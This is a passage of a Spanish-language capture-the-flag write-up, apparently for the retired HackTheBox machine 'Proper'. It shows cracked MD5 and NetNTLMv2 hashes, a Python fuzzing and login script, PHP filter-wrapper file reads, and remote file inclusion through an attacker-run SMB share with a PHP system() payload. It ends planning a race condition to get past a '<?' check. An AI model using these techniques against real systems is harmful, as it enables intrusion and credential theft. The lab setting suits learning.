+</blockquote>
+
+<p>Con el script podemos indicarle varios campos, por ejemplo <code>id</code> y <code>login</code> separados por comas (<code>,</code>), y nos devolvería el resultado de cada uno pero separado por <code>-</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_login.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, hay varios usuarios (no dumpeo todo porque nos echamos acá la vida entera :P, pero los hay) y tenemos unos correos… Caemos en cuenta del recurso que encontramos antes en nuestra enumeración, <code>/licenses</code>, nos mostraba un panel login que pedía exactamente eso, un mail.</p>
+
+<p>Pero claro, nos falta la contraseña, pues extraigamos las dos primeras a ver si podemos hacer algo con ellas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_passwordMD5.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si nos fijamos la contraseña siempre tiene el formato de ser un hash <code>MD5</code>:</p>
+
+<p>⛷️ <strong><em>La codificación del MD5 de 128 bits es representada típicamente como un número de 32 símbolos hexadecimales.</em></strong> <a href="https://es.wikipedia.org/wiki/MD5">Wikipedia</a></p>
+
+<blockquote>
+  <p><strong>Toma de la <code>a</code> a la <code>f</code>, de la <code>A</code> a la <code>F</code> y del <code>0</code> al <code>9</code></strong>.</p>
+</blockquote>
+
+<p>Por lo que para agilizar la extracción podemos pasarle únicamente símbolos hexadecimales como diccionario:</p>
+
+<pre><code class="language-py">...
+dic = string.hexdigits + "-£"
+...
+</code></pre>
+
+<p>Y volvemos a ejecutar…</p>
+
+<p>Mientras el script corre podemos jugar con los dos hashes de antes, probablemente sean crackeables, intentémoslo.</p>
+
+<p>Los guardamos en un archivo junto a su usuario (o no, como quieran):</p>
+
+<pre><code class="language-bash">❱ cat hashes 
+vikki.solomon@throwaway.mail:7c6a180b36896a0a8c02787eeafb0e4c
+nstone@trashbin.mail:6cb75f652a9b52798eb6cf2201057c73
+</code></pre>
+
+<p>Ahora usamos <code>John The Ripper</code> y el diccionario <code>rockyou.txt</code> para intentar crackearlas:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
+</code></pre>
+
+<p>Y en menos de un segundo vemos esto:</p>
+
+<pre><code class="language-bash">Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password1        (vikki.solomon@throwaway.mail)
+password2        (nstone@trashbin.mail)
+2g 0:00:00:00 DONE (2021-03-18 25:25) 11.76g/s 6776p/s 6776c/s 9035C/s football1..summer1
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Existen similitudes con los hashes para los dos usuarios (: YYYYYYYYYYYYY tenemos dos contraseñas para probar en el login panel.</p>
+
+<hr />
+
+<h2 id="licenses-web-part">Validamos credenciales en el login de <u>/licenses</u> <a href="#licenses-web-part">📌</a></h2>
+
+<p>Listo, ahora que tenemos credenciales podemos probar ante el login panel en <code>/licenses</code> y ver si conseguimos entrar, probemos con el primer usuario:</p>
+
+<ul>
+  <li><code>vikki.solomon@throwaway.mail</code> -&gt; <code>password1</code></li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses_loginDone.png" alt="321page80_licenses_loginDone" /></p>
+
+<p>VAMONOOOOOOOOOOOOOOOOOOOOOOOOOOOS, tenemos acceso al login panel.</p>
+
+<p>Vemos los productos del usuario, así que suponemos que cada usuario puede tener más o menos productos (de los productos que vimos al inicio).</p>
+
+<blockquote>
+  <p>Ya podemos dejar de descubrir hashes con nuestro script :P</p>
+</blockquote>
+
+<p>También en el header tenemos 3 links que hacen que nuestro “theme” o estilo de la web cambie…</p>
+
+<p>Dando vueltas buscando vulnerabilidades con alguno de los “themes” y volviendo a leer algunos otros a ver si era que se me había pasado alguno en el que fuera necesario estar autenticado para poder ser explotado no encontré nada útil…</p>
+
+<p>Después de un rato pensé en hacer un script que actuara como fuzzer a ver si encontrábamos otros “themes”, para que tomara cada directorio o archivo y lo concatenara con la <code>salt</code> y hacer el mismo proceso de antes, enviar el payload con su respectivo <code>hash</code>.</p>
+
+<p>Pero en su ejecución final terminamos encontrando algo mejor:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests
+import hashlib
+import signal
+
+# Ctrl + C
+def def_handler(sig, frame):
+    print("\nCancelado por el usuario, saliendo...\n")
+    exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Proceso login y fuzz
+url = "http://proper.htb/licenses"
+
+def fuzzing(session):
+    salt = "hie0shah6ooNoim"
+
+    with open('/opt/SecLists/Discovery/Web-Content/raft-small-directories.txt', 'r') as wordlist:
+        for line in wordlist:
+            # Quitamos espacios finales de la cadena
+            payload = line.rstrip("\n")
+            # Generamos hash: md5(salt+payload)
+            hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
+
+            cookie = session.cookies.get_dict()
+            parameters = "?theme=" + payload + "&amp;h=" + hashh
+
+            r = session.get(url + "/licenses.php" + parameters, cookies=cookie)
+
+            print("\n[+] \"Theme\": %s -&gt; %s" % (payload, parameters))
+            print(r.text)
+
+def login():
+    session = requests.Session()
+
+    data_post = {
+        "username" : "vikki.solomon@throwaway.mail",
+        "password" : "password1"
+    }
+
+    r = session.post(url + "/index.php", data=data_post)
+    fuzzing(session)
+
+if __name__ == '__main__':
+    login()
+</code></pre>
+
+<p><strong>(QUE JESO ↑)</strong></p>
+
+<p>Lo que estamos haciendo es sencillo, resumidamente por si te perdiste:</p>
+
+<ul>
+  <li>Primero iniciamos sesión para poder hacer peticiones a la ruta <code>/licenses.php</code> con la sesión de <code>vikki</code>.</li>
+  <li>Tomamos cada línea del wordlist y lo concatenamos con la <code>salt</code> (como antes).</li>
+  <li>Y simplemente hacemos la petición, donde los parámetros son: <code>theme=&lt;linea&gt;</code> y <code>h=&lt;hash&gt;</code>.</li>
+</ul>
+
+<p>Así que por ejemplo, llega la línea <code>hola</code>:</p>
+
+<pre><code class="language-py">&gt;&gt;&gt; import hashlib
+&gt;&gt;&gt; salt = "hie0shah6ooNoim"
+&gt;&gt;&gt; payload = "hola"
+&gt;&gt;&gt; hash = hashlib.md5(salt.encode() + payload.encode()).hexdigest()
+&gt;&gt;&gt; print("MD5(%s + %s) = Hash: %s" % (salt, payload, hash))
+MD5(hie0shah6ooNoim + hola) = Hash: 5557007e63c9d95d45ca15a39ff4a5d6
+&gt;&gt;&gt; 
+</code></pre>
+
+<p>Entonces finalmente la consulta que haría seria:</p>
+
+<pre><code class="language-php">?theme=hola&amp;h=5557007e63c9d95d45ca15a39ff4a5d6
+</code></pre>
+
+<p><strong>(FIN…)</strong></p>
+
+<p>Entonces al ejecutarlo, vemos esto con cualquier petición que hace:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_licensesPY_error_foundPHP.png" alt="321bash_licensesPY_error_foundPHP" /></p>
+
+<p>Opa, el principal error es que intenta llamar un archivo, pero no lo encuentra (en el caso de la imagen intenta abrir el “theme” <strong>intranet</strong> en la ruta <code>intranet/header.inc</code>).</p>
+
+<hr />
+
+<h2 id="web-rfi">Estudiamos posible <u>Remote File Inclusion</u> en la web <a href="#web-rfi">📌</a></h2>
+
+<p>Ahora, revisando detalladamente el error nos damos cuenta del uso de la función:</p>
+
+<pre><code class="language-php"> 31 | // Following function securely includes a file. Whenever we
+ 32 | // will encounter a PHP tag we will just bail out here.
+</code></pre>
+
+<p>Aseguran la inclusión de un archivo, donde si se encuentra un tag de <strong>PHP</strong> (<code>&lt;?</code>) en el contenido del mismo, simplemente muestra error y no hace el include:</p>
+
+<pre><code class="language-py"> 33 | function secure_include($file) {
+ 34 |   if (strpos(file_get_contents($file),'&lt;?') === false) {     &lt;&lt;&lt;&lt;&lt; Error encountered in this line.
+ 35 |     include($file);
+ 36 |   } else {
+ 37 |     http_response_code(403);
+ 38 |     die('Forbidden - Tampering attempt detected.');
+ 39 |   }
+ 40 | }
+</code></pre>
+
+<blockquote>
+  <p><a href="https://www.php.net/manual/es/function.strpos.php">strpos</a> encuentra la <strong>posición</strong> de la primera ocurrencia (cuando encuentra X cadena) en X contenido…</p>
+</blockquote>
+
+<blockquote>
+  <p><code>$a</code> === <code>$b</code> / Idéntico / <code>true</code> si <code>$a</code> es igual a <code>$b</code>, y la variable es del <strong>mismo tipo</strong>.</p>
+  <blockquote>
+    <p><a href="https://www.php.net/manual/es/language.operators.comparison.php">Operadores de comparación en <strong>PHP</strong></a>.</p>
+  </blockquote>
+</blockquote>
+
+<p>¿Se entiende lo que hace la función y el uso de <code>strpos</code>? Simulemos esto para que quede más claro:</p>
+
+<ul>
+  <li><a href="https://paiza.io/es/projects/new">Editor <strong>PHP</strong> online</a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-php">&lt;?php
+
+// Digamos que este es el contenido del archivo, un simple hola en codigo PHP.
+$contenido_archivo = "&lt;?php echo 'Hola'; ?&gt;";
+
+// Validamos que en el contenido este la cadena  &lt;?, si esta, la validacion se vuelve  true  y nos muestra el error.
+if (strpos($contenido_archivo, '&lt;?') === false) {
+    echo "Contenido: ".$contenido_archivo."\n";
+    echo "Tamos bien";
+}
+else {
+    echo "Contenido: ".$contenido_archivo."\n";
+    echo "Error, tag detectado :P";
+}
+
+?&gt;
+</code></pre>
+
+<p>Ejecutamos:</p>
+
+<pre><code class="language-php">Contenido: &lt;?php echo 'Hola'; ?&gt;
+Error, tag detectado :P
+</code></pre>
+
+<p>Y si cambiamos el orden del <code>&lt;?</code> igual seguimos teniendo el error :P</p>
+
+<pre><code class="language-php">Contenido: php echo 'Hola'; &lt;?php echo ''; ?&gt;
+Error, tag detectado :P
+</code></pre>
+
+<p>Si le quitamos el <strong>tag</strong> y ejecutamos:</p>
+
+<pre><code class="language-php">Contenido: php echo 'ahora no hay tag inicial'; ?&gt;
+Tamos bien
+</code></pre>
+
+<p>Listo, sabienod que hace y como funciona el <code>strpos</code> podemos seguir…</p>
+
+<p>…</p>
+
+<p>Sabemos que en este caso el error que nos muestra es por que no encuentra el archivo para cargar el “theme”, pero ahora sabemos tambien que valida su contenido en busca de algun tag <strong>PHP</strong>…</p>
+
+<p><strong><em>Por si no quieres ver todos los fallos que hice te dejo dos opciones:</em></strong></p>
+
+<p>🤍 <a href="#testing-securefunc">Test con el posible <strong>RFI</strong>, testeando y dando algunas explicaciones de más yyyy más testeo</a>.<br />
+❤️ <a href="#found-ntlmv2">Jugando con el <strong>RFI</strong> logramos interceptar un hash <strong>NTLMv2</strong></a>.</p>
+
+<hr />
+
+<h2 id="testing-securefunc">Testaaando y confirmando <u>Remote File Inclusion</u> <a href="#testing-securefunc">📌</a></h2>
+
+<p>Jugando con esto se me ocurrió levantar un servidor web e intentar cargar un archivo X como “theme”, modificando el script quedaría así:</p>
+
+<pre><code class="language-py">...
+def fuzzing(session):
+    salt = "hie0shah6ooNoim"
+    payload = "http://10.10.14.178:8000/locuras"
+
+    # Generamos hash: md5(salt+payload)
+    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
+
+    cookie = session.cookies.get_dict()
+    parameters = "?theme=" + payload + "&amp;h=" + hashh
+
+    r = session.get(url + "/licenses.php" + parameters, cookies=cookie)
+
+    print("\n[+] \"Theme\": %s -&gt; %s" % (payload, parameters))
+    print(r.text)
+...
+</code></pre>
+
+<p>Levantamos el servidor:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y ejecutamos, vemos que intenta cargar el “theme”:</p>
+
+<pre><code class="language-bash">[+] "Theme": http://10.10.14.178:8000/locuras -&gt; ?theme=http://10.10.14.178:8000/locuras&amp;h=63b61941e36339f3b23fc614b16a3124
+&lt;!-- [2] file_get_contents(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: HTTP request failed! HTTP/1.0 404 File not found
+...
+&lt;!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
+...
+&lt;!-- [2] include(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: no suitable wrapper could be found
+...
+</code></pre>
+
+<p>Y en nuestro servidor:</p>
+
+<pre><code class="language-bash">10.10.10.231 - - [25/Mar/2021 25:25:25] code 404, message File not found
+10.10.10.231 - - [25/Mar/2021 25:25:25] "GET /locuras/header.inc HTTP/1.0" 404 -
+</code></pre>
+
+<p>😮 vemos en los errores de <strong>PHP</strong> que no esta habilitado el incluir archivos mediante una <strong>URL</strong>, pero obtenemos la petición en nuestro servidor de <strong>Python</strong>, probemos a ver que podemos lograr con esto…</p>
+
+<ul>
+  <li>Siempre hará la petición buscando un archivo <code>header.inc</code>.</li>
+  <li>Esto lo hace concatenando el directorio (payload que le podemos pasar) con <code>/header.inc</code>.</li>
+</ul>
+
+<p><a href="https://stackoverflow.com/questions/7129842/what-is-an-inc-and-why-use-it">.inc files</a>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_incFiles.png" alt="321google_incFiles" /></p>
+
+<p>Jugando un rato -logramos- extraer los archivos <code>header.inc</code> de cada <em>theme</em>, esto usando <a href="https://www.php.net/manual/en/wrappers.php">wrappers</a> (antes vimos que el <strong>wrapper</strong> <code>http</code> estaba deshabilitado), por ejemplo usando el <strong>wrapper</strong> <code>php://</code> para que junto a un filtro convierta el contenido de un archivo a <code>base64</code> (esto es importante para archivos <code>PHP</code>, ya que son interpretados y no podríamos ver su contenido si los llamamos así como así e.e) para posteriormente copiar la cadena, decodearla y guardar su resultado en un archivo.</p>
+
+<p>Así veríamos el contenido del archivo, hagámoslo para el <code>header.inc</code> del <em>theme</em> <code>solar</code>:</p>
+
+<ul>
+  <li><a href="https://ironhackers.es/herramientas/lfi-cheat-sheet/"><strong>PHP</strong> wrappers - Cheat Sheet</a>.</li>
+</ul>
+
+<p>(<strong><em>Agregué el tomar el payload desde la terminal, que pereza estar entrando a cambiarlo a mano :P</em></strong>)</p>
+
+<pre><code class="language-bash">❭ python3 licenses.py "php://filter/convert.base64-encode/resource=solar"
+
+[+] "Theme": php://filter/convert.base64-encode/resource=solar -&gt; ?theme=php://filter/convert.base64-encode/resource=solar&amp;h=da608eae83164e4c3ff7d60869eeed12
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=
+</code></pre>
+
+<p>🔢 <strong><em>Archivo <a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/licenses.py">licenses.py</a> final</em></strong>.</p>
+
+<p>Lo que hace por detrás la función del código <strong>PHP</strong> es:</p>
+
+<pre><code class="language-php">include(php://filter/convert.base64-encode/resource=solar/header.inc)
+</code></pre>
+
+<p>Tomamos la cadena, la decodeamos y guardamos en un archivo:</p>
+
+<pre><code class="language-bash">❭ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=" | base64 -d &gt; solarheader.inc
+</code></pre>
+
+<p>Yyy:</p>
+
+<pre><code class="language-bash">❭ cat solarheader.inc
+</code></pre>
+
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;title&gt;Licenses&lt;/title&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+    &lt;link rel="stylesheet" href="solar/bootstrap.min.css"&gt;
+  &lt;/head&gt;
+</code></pre>
+
+<p>Solamente vemos las cabeceras que llaman el <code>css</code> de cada <strong><em>theme</em></strong>, o sea para cambiar el fondo de la web :(</p>
+
+<p>🏋️ Simplemente unos recursos que me gustaron, pero en la práctica no me funcionaron 😥:</p>
+
+<ul>
+  <li><a href="https://security.stackexchange.com/questions/181704/exploit-lfi-bug-when-a-inc-php-is-appended-to-the-file-name">Exploit LFI bug when a inc php is appended to the file name</a>.</li>
+  <li><a href="https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225">Exploiting local file inclusion LFI using php wrapper</a>.</li>
+</ul>
+
+<hr />
+
+<h2 id="found-ntlmv2">Jugando con el <u>RFI</u> interceptamos un hash <strong>NTLMv2</strong> <a href="#found-ntlmv2">#</a></h2>
+
+<p>Encontramos <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">este recurso</a> y leyendo vemos un paso que no habíamos intentado:</p>
+
+<p>🎫 <strong>Bypass allow_url_include</strong>:</p>
+
+<blockquote>
+  <p>When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to Off. It is still possible to include a remote file on Windows box using the <code>smb protocol</code>.</p>
+</blockquote>
+
+<p>Ojiiiiiito, no habíamos intentado el compartirnos una carpeta con <strong>SMB</strong> y desde el <strong>RFI</strong> intentar conectarnos a ella, probémoslo…</p>
+
+<p>Si recordamos, <code>allow_url_include</code> esta seteado a <code>0</code> (o sea apagado <em>Off</em>), lo vimos cuando intentamos llamar el recurso a través de nuestra URL… Así que podemos probar los siguientes pasos:</p>
+
+<ol>
+  <li>Compartir una carpeta mediante <strong>SMB</strong> donde tengamos el archivo que queramos llamar.</li>
+  <li>Y desde la petición agregar <code>\\&lt;ip&gt;\&lt;folder&gt;\&lt;file&gt;</code></li>
+</ol>
+
+<p>Entonces, levantemos el servidor SMB, donde la carpeta compartida se llama <code>smbFolder</code> y tomara todos los archivos de la ruta actual (<code>$(pwd)</code>):</p>
+
+<pre><code class="language-bash">❭ python3 smbserver.py smbFolder $(pwd) -smb2support
+</code></pre>
+
+<p>Creamos un archivo (<code>toctoc.php</code>) y tendrá este contenido (o cualquier otro):</p>
+
+<p><strong>Podemos hacer el mismo proceso, pero con el archivo <code>header.inc</code>, solo que en la petición pondríamos únicamente nuestra carpeta compartida (recordemos que la misma función agrega <code>/header.inc</code> al final).</strong></p>
+
+<pre><code class="language-php">❭ cat toctoc.php
+&lt;?php system("ping -c 1 10.10.14.178"); ?&gt;
+</code></pre>
+
+<blockquote>
+  <p>Aunque si todo va bien, deberíamos ver el error de <code>tempering</code>, ya que <code>&lt;?</code> existe en el archivo…</p>
+</blockquote>
+
+<p>Y desde la petición hacemos:</p>
+
+<pre><code class="language-bash">❭ python3 licenses.py "\\\10.10.14.178\\smbFolder\\toctoc.php"
+...
+</code></pre>
+
+<p>En nuestra carpeta compartida tenemos respuesta:</p>
+
+<pre><code class="language-bash">[*] Incoming connection (10.10.10.231,63214)
+[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
+[*] User PROPER\web authenticated successfully
+[*] web::PROPER:aaaaaaaaaaaaaaaa:daf4f08da81ca1e00259289c66835220:010100000000000080b0c6bcc921d701671afff0fbf20627000000000100100070006d004f005a00460041007a006f000300100070006d004f005a00460041007a006f000200100075004100590057004200610076004f000400100075004100590057004200610076004f000700080080b0c6bcc921d7010600040002000000080030003000000000000000000000000020000085e4cbc8f5cc59435a6b4c52725d8e804fa85d00514be6c0b958277c8fa029f80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
+[*] Closing down connection (10.10.10.231,63214)
+[*] Remaining connections []
+...
+# Lo hace muchas veces, asi que obtenemos varias veces una respuesta.
+</code></pre>
+
+<p>Opa, tenemos el hash <a href="https://geeks.ms/juansa/2008/12/26/seguridad-autenticarse-ntlm-ntlmv2-kerberos/">Net NTLMv2</a> del usuario del servidor web, en este caso de <code>PROPER/web</code> :P Probemos a crackearla, quizás es débil…</p>
+
+<p>Tomamos <code>web::PROPER:a.....0000</code> y lo guardamos en un archivo, lo llamaré <code>hash</code> e intentamos crackearlo:</p>
+
+<pre><code class="language-bash">❭ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+
+<p>En un rato vemos esto:</p>
+
+<pre><code class="language-bash">Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+charlotte123!    (web)
+1g 0:00:00:02 DONE (2021-03-26 25:25) 0.4629g/s 458800p/s 458800c/s 458800C/s charlotte1990..charlieishot
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Perfectooooooooooooooooo, tenemos una contraseña del usuario <strong>web</strong> (: peroooo ¿dónde las usamos? :O En el portal de licencias no logramos nada jugando con mails…</p>
+
+<ul>
+  <li>Pa leer: <a href="https://en.hackndo.com/ntlm-relay/"><strong>NTLM relay</strong> y explicaciones interesantes</a>.</li>
+  <li>Pa ver: <a href="https://www.youtube.com/watch?v=fIGvOGrdxyc&amp;t=2794s">Youtube - <strong>S4vitar</strong> explicando <strong>Net-NTLM</strong></a>.</li>
+</ul>
+
+<p>Volviendo a la respuesta de la petición que hicimos hacia nuestra carpeta compartida nos da un fallo todo lindo (pero al menos es diferente):</p>
+
+<pre><code class="language-php">&lt;!-- [2] include(\\10.10.14.178\smbFolder\toctoc.php/header.inc): failed to open stream: Invalid argument
+</code></pre>
+
+<p>🎺 <strong><em>Jugué con <code>null bytes</code>, agregando <code>URL Encode</code> (sale el error del <code>tampering</code>), di espacios para que tomara el archivo del folder y después el header, agregue dentro del archivo <code>header.inc</code> código <code>PHP</code> y código <code>html</code> para ver si lo interpretaba o al menos no salía el error anterior</em></strong><strong>, pero nada :(</strong></p>
+
+<blockquote>
+  <p>Acá estoy dudando si es que mi carpeta compartida en <code>SMB</code> tiene algún error (ya que sale el error <code>Invalid Argument</code>, y buscando referencian que es por no escapar <code>\</code>, pero si las escapé) o no sé si es que deba salir ese error pero que por detrás si se esta subiendo el archivo… De las pruebas que he hecho no veo que esto último este pasando.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>De pura locura me puse a revisar el archivo <code>smbserver.py</code> (porque si) y me di cuenta de que podemos levantar la carpeta compartida con un usuario… ¿Y si intentamos compartirla como si fuéramos <code>web</code>? Quizás el problema es la autenticación y por eso no lograba la conexión con el archivo, intentémoslo:</p>
+
+<pre><code class="language-bash">❭ python3 smbserver.py smbFolder $(pwd) -smb2support -username web -password "charlotte123!"
+</code></pre>
+
+<p>Y ahora lanzamos la petición a ver si lee nuestro archivo, usemos el <code>header.inc</code> de <code>solar</code> pero con una modificación para identificarlo:</p>
+
+<pre><code class="language-bash">❭ cat header.inc
+&lt;h2&gt;Este es mi tema perri&lt;/h2&gt;
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
+</code></pre>
+
+<p>Recibimos en nuestra carpeta compartida:</p>
+
+<pre><code class="language-bash">...
+[*] Incoming connection (10.10.10.231,61502)
+[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
+[*] User PROPER\web authenticated successfully
+[*] web::PROPER:aaaaaaaaaaaaaaaa:c806c7a6bcdc62ef33e516d7483e4856:0101000000000000005dc3b16922d70131c01ee481185b30000000000100100044006a007a004e0057007200450044000300100044006a007a004e0057007200450044000200100077004300750050006200490047005900040010007700430075005000620049004700590007000800005dc3b16922d70106000400020000000800300030000000000000000000000000200000094df3dcd57d3446771048246011a53ff8eff1656c86731c3bcd89f72886362a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
+[*] Connecting Share(1:SMBFOLDER)
+[*] Disconnecting Share(1:SMBFOLDER)
+[*] Closing down connection (10.10.10.231,61502) 
+[*] Remaining connections []
+</code></pre>
+
+<p>Y en la petición vemos:</p>
+
+<pre><code class="language-bash">...
+[+] "Theme": \\10.10.14.178\smbFolder -&gt; ?theme=\\10.10.14.178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52
+&lt;!DOCTYPE html&gt;
+    &lt;h2&gt;Este es mi tema perri&lt;/h2&gt;
+    &lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;Licenses&lt;/title&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+        &lt;link rel="stylesheet" href="solar/bootstrap.min.css"&gt;
+    &lt;/head&gt;
+
+  &lt;body&gt;
+  ...
+...
+</code></pre>
+
+<p>PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOoowowowo</p>
+
+<blockquote>
+  <p>Lo que hace es: <code>include(\\10.10.14.178\smbFolder/header.inc)</code>.</p>
+</blockquote>
+
+<p>En <code>Burp</code> se ve más lindo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_RFI_headerINC_done.png" alt="321burp_RFI_headerINC_done" /></p>
+
+<p>Bien bien, tenemos entonces <a href="https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii">Remote File Inclusion</a> confirmado (que resumidamente es incluir un archivo externo al servidor).</p>
+
+<p>Ahora debemos lidiar con <code>strpos</code>, a ver como podemos bypassear esa parte y lograr subir nuestra Shell… O que interprete nuestro archivo externo.</p>
+
+<pre><code class="language-bash">❭ cat header.inc
+&lt;h2&gt;Este es mi tema perri&lt;/h2&gt;
+</code></pre>
+
+<p>Y obtenemos efectivamente el error:</p>
+
+<pre><code class="language-bash">❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
+
+[+] "Theme": \\10.10.14.178\smbFolder -&gt; ?theme=\\10.10.14.178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52
+Forbidden - Tampering attempt detected.
+</code></pre>
+
+<p>Intentando crear un payload (llamado <code>header.inc</code>) con <code>msfvenom</code> para inyectarlo en la web logramos que lo lea, pero no que lo interprete. Así que si o si debemos inyectar código <code>.php</code> para que sea interpretado (ejecutado) por la web…</p>
+
+<hr />
+
+<h2 id="web-racecondition">Intentamos <u>Race Condition</u> para sobreescribir contenido del objeto <u>header.inc</u> con código <u>PHP</u> <a href="#web-racecondition">📌</a></h2>
+
+<p>Jmmm dándole varias vueltas podemos pensar algo: La web esta buscando el archivo <code>header.inc</code> cierto? Listo, lo creamos en nuestra carpeta compartida y la web logra leerlo YYY ejecutarlo… Acá fácil, pero no podemos simplemente cambiar el contenido del archivo por código <code>p</code>, ya que la primera validación es que si encuentra <code>&lt;?</code> dentro del contenido del archivo, el proceso será cancela y nos mostrara un error…</p>
+
+<p>Pero ¿y si intentamos modificar el contenido del archivo <code>header.inc</code> por código <code>php</code> al mismo tiempo en que la web lo busca al hacer la solicitud? WTF</p>
+
+<p>Podríamos hacer que inicialmente tome el contenido del archivo <code>header.inc</code> (HTML to lindo sin <code>&lt;?</code>), esto hará que pase el filtro de la función <code>strpos</code> y mientras hace el <code>include</code> modificamos el contenido del archivo para que tome nuestro payload y finalmente estaría interpretándolo…</p>
+
+<p>Que sería un <code>race condition</code>, donde existe un proceso ejecutándose peeeero nosotros al mismo tiempo intentamos ser más rápidos y así ejecutar lo que necesitemos dentro de ese proceso (<strong>ganar</strong>, por eso es llamada <strong>race</strong>)…</p>
+
+<p>⚠️🛑⚠️ <strong>Esto son pequeños spoilers de máquinas retiradas, por si algo :P</strong> ⚠️🛑⚠️</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=BFSdJYS1gFs&amp;t=4600"><strong>IppSec</strong> lo usa para hacer un link simbólico al <strong>id_rsa</strong> de un usuario, donde realmente debería estar mostrando un simple mensaje</a>.</li>
+  <li><a href="https://www.youtube.com/watch?v=ehoh6g5dSWk&amp;t=3560s"><strong>IppSec</strong> de nuevo nos muestra como logra inyectar código <strong>PHP</strong> mientras sube un archivo que no debería tener <strong>PHP</strong></a>.</li>
+  <li><a href="https://0xdf.gitlab.io/2020/08/29/htb-quick.html#method-1-read-as-srvadm"><strong>0xdf</strong> explica detalladamente como hacer un link simbólico de nuevo al <strong>id_rsa</strong> mientras se genera un simple mensaje</a>.</li>
+</ul>
+
+<p>Esta imagen me gusto mucho, es tomada de <a href="https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html">acá</a>, pero creo que originalmente es tomada de <a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/">este graaaaaaaan articulo</a>:</p>
+
